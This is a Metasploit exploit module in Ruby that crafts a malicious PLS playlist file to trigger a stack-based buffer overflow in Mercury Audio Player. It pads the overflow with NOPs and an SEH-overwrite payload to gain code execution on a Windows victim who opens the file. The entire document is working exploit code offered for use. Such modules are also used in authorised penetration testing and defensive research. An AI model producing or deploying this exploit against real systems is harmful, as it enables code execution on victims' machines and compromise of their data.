require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Mercury Audio Player(PLS File) Stack Overflow.',
			'Description'    => %q{
					This module exploits a stack-based buffer overflow in the Mercury Audio Player.
					An attacker must send the file to victim and the victim must open the file.
					Alternatively it may be possible to execute code remotely via an embedded
					PLS file within a browser, when the PLS extention is registered to Mercury.
					This functionality has not been tested in this module.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'dougsko' ],
			'Version'        => '0.0.1',
			'References'     =>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/8582' ],
				],
			'Payload'        =>
				{
					'Space'    => 1024,
					'BadChars' => "\x00\x0a\x0d\x3c\x22\x3e\x3d",
					'EncoderType'   => Msf::Encoder::Type::AlphanumMixed,
					#'StackAdjustment' => -3500,
				},
			'Platform' => 'win',
			'Targets'        => 
				[
					[ 'Default', { 'Ret' => 0x0012A610,
                                   'BufSize' => 3000,
                                 } 
                    ], 
				],
			'Privileged'     => false,
			'DisclosureDate' => '24 Sep 2004',
			'DefaultTarget'  => 0))

			register_options(
				[
					OptString.new('FILENAME', [ false, 'The file name.',  'exploit_mercury.pls']),
					OptString.new('OUTPUTPATH', [ false, 'The location of the file.',  './']),
				], self.class)

	end

	def exploit
        seh = generate_seh_payload(target.ret)
        filepls = "[playlist]\n"
        filepls += "NumberOfEntries=1\n\n"
        filepls += "File1=foo.mp3"
		filepls += make_nops(target['BufSize'] - seh.length) + seh
        filepls += [target.ret].pack('V')
        filepls += "\nTitle1=title\nLength1=-1\n\nVersion=2"

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(filepls)

	end

end

